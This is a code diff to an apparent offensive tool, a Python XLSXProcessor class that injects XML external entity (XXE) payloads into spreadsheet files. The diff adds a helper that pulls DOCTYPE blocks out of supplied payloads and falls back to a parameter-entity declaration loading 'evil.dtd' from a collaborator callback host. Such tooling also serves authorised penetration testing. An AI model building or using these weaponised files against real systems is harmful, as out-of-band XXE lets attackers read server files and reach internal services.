@@ -1,4 +1,4 @@
-import os, zipfile, tempfile, shutil, uuid, logging
+import os, zipfile, tempfile, shutil, uuid, logging, re
 from datetime import datetime
 from werkzeug.utils import secure_filename
 
@@ -60,20 +60,45 @@ class XLSXProcessor:
     def _inject(self, content, payload_type, payload, collaborator):
         if "<?xml" not in content:
             return content
+
+        injection = self._build_injection_snippet(payload_type, payload, collaborator)
+
         lines = content.split("\n")
         result = []
         done = False
         for line in lines:
             result.append(line)
             if not done and "<?xml" in line:
-                if payload_type == "doctype":
-                    result.append('<!DOCTYPE xxe [\n<!ENTITY % xxe SYSTEM "{}/evil.dtd">\n%xxe;\n]>'.format(collaborator))
-                elif payload_type == "xinclude":
-                    result.append('<!-- XInclude href="{}" parse="text" xmlns:xi="http://www.w3.org/2001/XInclude" -->'.format(payload))
-                elif payload_type in ("dtd", "svg"):
-                    result.append("<!-- {} payload injected -->".format(payload_type.upper()))
+                if injection:
+                    result.append(injection)
                 done = True
         return "\n".join(result)
+
+    def _build_injection_snippet(self, payload_type, payload, collaborator):
+        payload = payload or ""
+        if payload_type == "doctype":
+            snippet = self._extract_doctype_block(payload)
+            if snippet:
+                return snippet
+            return '<!DOCTYPE xxe [\n<!ENTITY % xxe SYSTEM "{}/evil.dtd">\n%xxe;\n]>'.format(collaborator)
+        if payload_type == "svg":
+            snippet = self._extract_doctype_block(payload)
+            if snippet:
+                return snippet
+            return "<!-- SVG payload: {} -->".format(payload)
+        if payload_type == "dtd":
+            return payload or "<!-- DTD payload unavailable -->"
+        if payload_type == "xinclude":
+            return "<!-- XInclude payload: {} -->".format(payload)
+        return payload
+
+    def _extract_doctype_block(self, payload):
+        match = re.search(r"<!DOCTYPE[\s\S]*?]>", payload, re.IGNORECASE)
+        return match.group(0) if match else ""
+
+    def _extract_xinclude_fragment(self, payload):
+        match = re.search(r"<xi:include\b[^>]*?/?>", payload, re.IGNORECASE | re.DOTALL)
+        return match.group(0) if match else ""
 
     def analyze_xlsx_structure(self, input_path):
         if not input_path or not input_path.endswith(".xlsx"):
